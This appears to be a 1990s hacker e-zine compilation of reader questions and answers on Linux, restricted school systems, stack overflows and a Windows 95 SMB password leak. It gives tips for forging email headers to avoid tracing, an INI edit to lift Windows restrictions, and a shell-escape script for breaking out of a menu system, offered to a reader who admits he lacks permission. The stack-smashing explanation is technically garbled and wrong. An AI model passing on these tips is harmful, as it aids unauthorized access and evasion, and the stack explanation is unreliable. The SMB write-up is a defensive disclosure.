   *** Linux Questions 
=================================================================

   a friend and i discovered something. We were both in our linux 
   and when i tried doing a finger, I'll show up with all the 
   other users, but him. But if I did a who he will be on !!!. We 
   use a Red Hat Linux release 4.0 (Colgate) Kernel 2.0.18, is 
   this a bug ???  an exploit???  his login is rmartinez and by 
   using who we'll see rmartinez if we finger 
   rmartinez@blah.blah.blah we=B4ll see all his description 
   apparently someone told us it was due to the fact that his 
   username was too long so he could be authenticated but that 
   linux won't consider it as a user.

   Can we get anything useful from this??

   | When i was interested in getting linux, i had the same problem. 
   | I bought RedHat Linux Unleashed (from SAMS publishing). It is 
   | bundled with a really nice linux cd that has plenty of stuff on 
   | it to get you started. It also comes with LILO (read: "lie low"). 
   | That's a boot system for linux that enables you to run multiple 
   | OS's. 
   | The book tells you how to set it all up. 
   | 
   | You're going to need to partition your drive. In order not to 
   | erase your 95 stuff, you have to use FIPS or another partitioning 
   | utility. The book explains this all in detail. The point? Get 
   | yourself a linux book and cd and just follow the instructions.

   (snip)

   Ok.  I was using Slackware (kernel 1.2.3).  It did not have a 
   lot of the utilities that I wanted, such as pppd.  So I 
   downloaded the full RedHat 4.0 distribution (about 80+ mb.) 
   from Sunsite.  I downloaded the Root and Boot diskettes, and 
   ran the installation.  I had a second partition set up. Half 
   way thru the installation, I got a ton of error messages, so I 
   shut down for the night.  When I tried to boot Windoze the 
   next day to check my email, nobody home!!  (Redhat F***'d up 
   my MBR!!)  I tried fdisk /mbr, but nothing worked.  I had to 
   reinstall Windoze 95!  Fun!!  So, be careful !!

   BACKUP!!

>From Technomancer <technomancer@netasia.net> (

   Hello!

   I have currently installed Slackware Linux at the office.  The 
   installation went out fine but the problem I encountered was 
   how am I going to connect to the internet and also to our LAN? 
   I have used netconfig and IMHO, I was able to input the 
   correct values.  Still if I try to ping our DNS, Linux says 
   that the network is not reachable or something to that effect. 
   I am using Ethernet 3Com 509 and I have another box using 
   NE2000.  What should I do?  I've skimmed through Linux 
   Unleashed and it assumes that we are connected properly.  I 
   tried GNU Linux too but the same thing happens. Please help. 
   Thanks in advance! :)

   Covering your tracks becomes very easy with experience. 
   Headers can be faked, just after typing DATA type the header 
   info you want, and the real header will be added onto that. 
   If your DNS is username@domain.com as opposed to 
   username@ts-12.ppp-56.nyc.domain.com or something then it 
   becomes much easier.  It even HELPS you to go to a computer 
   that is running Ident. All you have to do is download an Ident 
   Daemon, or use mIRC's, change your username to root in the 
   daemon, and send the fakemail.

   Tips for sending fakemail: 
   1. Use a big server, so it is harder to look at the logs. 
   2. Fake the header, so that they can't trace your IP without 
      great difficulty (it is much easier for someone to look at 
      the first IP in the header, and trace that, then go through 
      all the IPs in the header and trace all of them. ) it helps 
      to use real domains and IPs. 
   3. Fake Ident. 
   4. Make sure it doesn't say "apparently from and apparently to" by 
         a) using a real domain 
         b) typing "from:(whoever)" and "to:(whoever)" after faking the 
         header (you 
      can give anything in the "from:", but if you give an Email 
      address as opposed to a name, make sure its the same as you 
      wrote in the "rcpt to:"). 
   5. Send yourself a copy first.

   When my school would not let us get to the Dos prompt when we 
   were logged into Novell, I turned to two of the hackers most 
   important resources, improvisation and more experienced 
   hackers.  Does your school/business restrict your access to 
   the Dos Prompt?  I am going to put on my web page 
   (http://www.geocities.com/TimesSquare/Arcade/4594) a list of 
   different ways to get into the Dos Prompt even when access is 
   restricted, send your ways to "samk5@idt.net" unless otherwise 
   specified in your Email, I will give credit where credit is 
   due.  A little taste of what's to come.

   Your School/Business might have put certain restrictions on 
   Windows which may shadow the RUN command and/or the NEW 
   command, and may even remove the "file" menu completely.  My 
   school had restricted access to everything besides removing 
   the "file" menu, so of course, my first stop were the INI 
   files.  Guess what I found?  Under Program.ini, there were two 
   suspicious lines towards the bottom, which read:

   editlevel=4 
   norun=1

   Usually in computer language 1 = true and 0 = false.  But the 
   Editlevel was a different thing. I could have taken the easier 
   way out and just put a colon in front of these lines, but I 
   thought I would do something a little less conspicuous.  I 
   changed "norun=1" to "norun=0" and "editlevel=4" to 
   "editlevel=0" and lo and behold, next time I booted Windows it 
   gave me all the options.

   First off under the identd tab you have show identd querys 
   checked that's why you see that in the status window. Second if 
   you want to know what it means and how it works you can read 
   rfc1413 which outlines the Identification Protocol (Identd) 
   and will tell you how it works and what it all means. Even so 
   the 1145, 25 : USERID : UNIX : fifo  is the response to the 
   server query 1145, 25, and means <port-on-server> , 
   <port-on-client> : <resp-type> : <add-info>. You can do a 
   search for rfc1413 or if you want I have a copy on my site at

   In the March 9-12 HH, pete@servtech.com replied to a message with:

         > the *s mean that the passwords are shadowed, for better 
         > security. (There have been other posts on that subject, so I 
         > won't grind it into the ground.)

   I reply:

   Actually, the *'s mean the username is not implemented. 
   Characters such as "x" or "!" mean that the password is 
   shadowed.

   Also, I am on a system running System V Release 4, set up with 
   a menu system, consisting of Pine, ftp, lynx, telnet, yadda 
   yadda yadda..  Basically, there are no shell accounts, no ftp 
   access..and shadowed passwords. They use an Annex Command Line 
   Interpreter that, upon login, sometimes drops you out of their 
   menu (before connecting to the system), and lets you view who 
   is on the nodes, what jobs are running, and the IP addresses 
   of servers...

   My question is: how would one go about getting out of the menu 
   system (ctrl-z is disabled within pine and others), and/or 
   root..

techmafia speaks: 
  
   There are two ways to do this.  First, create a file that 
   contains the following:

   #!/bin/sh 
   /usr/local/bin/tcsh

   FTP it to your site, call it 'blah', make sure it is 
   executable, (chmod +x blah  [from FTP if you cannot do it 
   from a shell or a program available to you]), and then set 
   your external editor to that.  Then when you run your external 
   editor, BOOM.  You get a shell.

   As for root: get the shell first.  Then there are billions of 
   ways to gain root.  Start surfing the net and look for new 
   exploits.

techmafia falls silent.

   "Do you have written permission to break into..blah.." "No" I just 
   want to do it for the sheer thrill of it, besides, why would I down a 
   server that I depend on?

   Shadow questions:

   Okie dokie. I've seen a lot of posts of late about shadowing, 
   and not to deny anyone the information, but it's real 
   annoying.  Shadowed system's are no fun. But even if you got 
   the shadow'd file, chances are the people aren't lame and they 
   have decent passwords.  (And even if they did use 'apple' for 
   a password most likely it would probably be illegal to use it). 
   So just as a little review:

   consider this /etc/passwd entry:

   root:ASisSDiejSmLOi:0:0:Charlie &:/root:/bin/bash 
   ^^ <-- normal entry. Encrypted password stored along with everything 
   else.

   Now, consider this one.

   root:*:0:0:Charlie &:/root:/bin/bash <--

   the * on a non shadowed system would disable the account whereas a * 
   on a shadowed system means the encrypted password is stored somewhere 
   else the accompanying shadow file looks like this:

   root:$1$WmBaRBqP$3fX5EsK78uRaU5PQE4nbh.:0:0::0:0:Charlie 
   &:/root:/bin/bash

   isn't life grand??

   As for the pwd.db a strings on the file yields :

   prozac 
   Brad Huges 
   /home/prozac 
   /bin/bash 
   1prozacdiscord 
   Discordia Login 
   /home/discord 
   /bin/bash 
   discord 
   Discordia Login 
   /home/discord 
   /bin/bash 
   ...

   So as we can see its user information.. 
 

   I hope this helps a lil..

   *** Stack Busting 
=================================================================

From: bbuster@succeed.net (Bronc Buster)

   Stacks Dumps (aka Smashing the Stack)

   How do people write code that makes some normal Unix program 
   crash and drop to a root shell? Most of this type of hacking 
   is done with what, I'm sure a lot of you know, is called a 
   "Stack Dump", or Smashing the Stack. Well what does this mean? 
   Well I'm going to attempt to get you a "crash" course in Data 
   Segments and Dynamic Memory Allocation. I know it sounds 
   complex and some of you are already scrolling down, but I'm 
   going to try, as usual, and put it into layman's terms.

   All computers that run an Intel 80x86, or Intel based 
   microprocessor (Pentiums, AMD, Cyrex) divide memory into 
   things called "segments".  These segments are of diffrent 
   sizes depending on how each program was programmed, and how 
   each allocates memory. There are Large, Medimum and Small 
   "memory models", as they are called. For the sake of this I'm 
   going to use the "Small memory model" which has 65,536 bytes 
   allocated for the programs use. To get a better picture of 
   what a Data Segment looks I'm making a diagram of a "Small 
   memory model Data segment"

                   /-|-----------------| <- 65,535 bytes 
                   | |                 | 
           Stack - | |                 | 
                   \-|-----------------| <- Movable Boundry 
                   / |                 | 
                   | |                 | 
           Heap -  | |                 | 
                   | |                 | 
                   \-|-----------------| <- Non-Movable Boundry 
                   / |                 | 
                   | |                 | 
          Static - | |                 | 
                   \-|-----------------| <- 0 bytes

   Let's start at the bottem and work up. The static area at the 
   bottom is for external and static variables. This is of a 
   preset size before the program is run because most of these 
   values are preset in the program.  This area holds basic 
   values and other items that remain through out the run of the 
   program and remain constent. The boundry above it is 
   Non-movable because of it's preset size.

   The Heap, or Near Heap is all the memory between the Static 
   and Stack area. This is the area the programs runs in. The 
   program uses this area and manages it assigning pieces of it 
   to sub-functions and other parts of the program as needed. 
   This is called "Dynamic Memory Allocation". The Heap will 
   always be of diffrent sizes as the Static area will, depending 
   on its needs, start out bigger or smaller. The Stack also 
   grows and shrinks moving it boundry and shrinking the Heap.

   Now onto the Stack. As I have said above, the Heap's size is 
   always diffrent depending on the preset Static area, and on 
   the Stack. The Stack will grow and shrink depending on other 
   variables. If a subfunction is called and has more variable 
   that are just used in this subfuntion, they are stored in the 
   Stack. For instance, if you get a prompt to enter some kind of 
   information for a program, chances are a subfunction is asking 
   for it, and it will be stored in the Stack until used; then 
   the memory it used will be cleared and that information 
   passed on, or deleted.

   Now what if a large program was running, doing a lot of little 
   things, and it asked you for a few lines of input. You input 
   50,000 letters.  (This is a poor example but I'm trying to put 
   it in simple terms.) Well if the program is not written 
   correctly as to limit your input, you could "Crash the Stack". 
   As the Heap gets bigger the boundry in between the Stack and 
   itself moves up, then if the Stack needs some bit of memory it 
   is forced to do with what little it has between the Heap 
   boundry and the roof at 65,535 bytes. If it needs more memory 
   and it is not available because it is all in use, it springs a 
   leak, or "dumps" over the top , hence "Stack Dump". In Unix 
   a lot of programs need to start a SUID process, or they need to 
   "run as root" in order to do what they have to do. Now if one 
   of these programs were to crash while this root process, or as 
   it's really a root shell, was open, it would drop the person 
   running it. If this shell were still open because the program 
   never got a chance to exit from it, you would get dropped 
   into it.

   That's that..

   I suggest if you want to learn more about Stack Dumps and 
   hacking Unix in general you learn C. Unix is made for C, it's 
   library functions are C, it's functions are C. Try going to a 
   few sites that have codes (like mine) that exploit these types 
   of holes and looking at what they do, and what they have in 
   common that makes them work.

   Can I get a .sig with this one?

   *** Windows Hacking 
=================================================================

From: Steve Birnbaum <sbirn@NETMEDIA.NET.IL>

See http://www.security.org.il/msnetbreak/ for more details.

What's new

   It is possible from anywhere on the Internet to obtain the 
   cleartext Windows 95 login password from a Windows 95 computer on a 
   network connected directly to the Internet given only the IP 
   address and the workgroup and leave no trace of your actions. It is 
   untested and may work with Windows For Workgroups as well.

Description

   There has been recent discussion on security mailing lists 
   concerning the fact that Microsoft Internet Explorer running on 
   Windows NT will automatically try to log in to a remote SMB server 
   (file server) without prompting the user or without the user's 
   knowledge. By design, the NT machine will transmit to this remote 
   server the encrypted password and username of the user. This is 
   documented by Aaron Spangler. The caveats with this are that the 
   passwords are encrypted and that in many cases people do not use 
   WWW browsers from NT servers, but rather from computers running 
   Windows 95.

   It has been explained that this same exploit does not work against 
   Windows 95 because Windows 95 is only capable of accessing SMB 
   shares (file sharing) if they are: 
     * Connected to the same subnet. 
     * In the Windows 95 computer's LMHOSTS file on startup 
     * Announced to the Windows 95 computer by a Master Browser

   It is this third and final condition that can be taken advantage of

   to obtain the cleartext password and username of any Windows 95 
   user who uses Microsoft Internet Explorer. Even careless use of 
   Microsoft Network Neighborhood can exploit this hole without the 
   requirement for Internet Explorer The requirements are knowledge of

   the user's IP address, workgroup name and that they access a 
   hostile web page. The first two are not difficult to obtain and the

   third does not have to be an obscure page. In the last 6 months 
   sites such as the CIA have been broken into. All it would require 
   is that one un-noticeable line be added to the home page. Since the

   viewable content of the page has not been altered, such a change 
   can go unnoticed for a long time.

From: Anonymous

In the beginner's series #2, Section 2.... about "hacking" windows 
95... you said there are ways to hack windows 95 boxes over a network. 
have a small LAN at home (and a big one at school <evil grin>) and 
would like to test some of these things on my home and my school. I am 
not trying to do things on my school network that are bad.... but... 
It would be nice to know some of the ways to hack windows 95 boxes 
over a LAN just in case some day it does come in handy. Also.... one 
of my friends has a censorship prog on his computer that censors him 
from EVERYTHING.... like... pages that contain the word "hack" are 
even blocked out! it is b******t! Can you tell me a few more ways 
to try just in case the ones you listed in the e-mag dont work?

Very simply...both are important, both should be fixed and we should 
ensure that CNN treats them equally.

Since both methods can be used to break into remote computers, it is 
picking at straws to say that one is more of a risk than the other.

> removing functionality is less preferable to improving control over

There is some "functionality" that Microsoft has provided that cannot 
be secured.  If a feature can be secured, great.  If not, it should 
not be there.  I do not consider the .url/etc problem fixed.  Browsers 
should be making a much bigger deal about files from the network.  To 
make the function to disable the warning as innocuous as making the 
checkbox to make the helpful hints window not show up is not a good 
solution. We are talking about serious risks.  I don't think that the 
risk is being made apparent enough to the average windows user who is 
going to disable every such checkbox by default.

I won't touch this one.  I think my opinions on it should be obvious.

When they took the fourth amendment, I was quiet because I didn't deal drugs. 
When they took the sixth amendment, I was quiet because I was innocent. 
When they took the second amendment, I was quiet because I didn't own a gun. 
Now they've taken the first amendment, and I can say nothing about it.
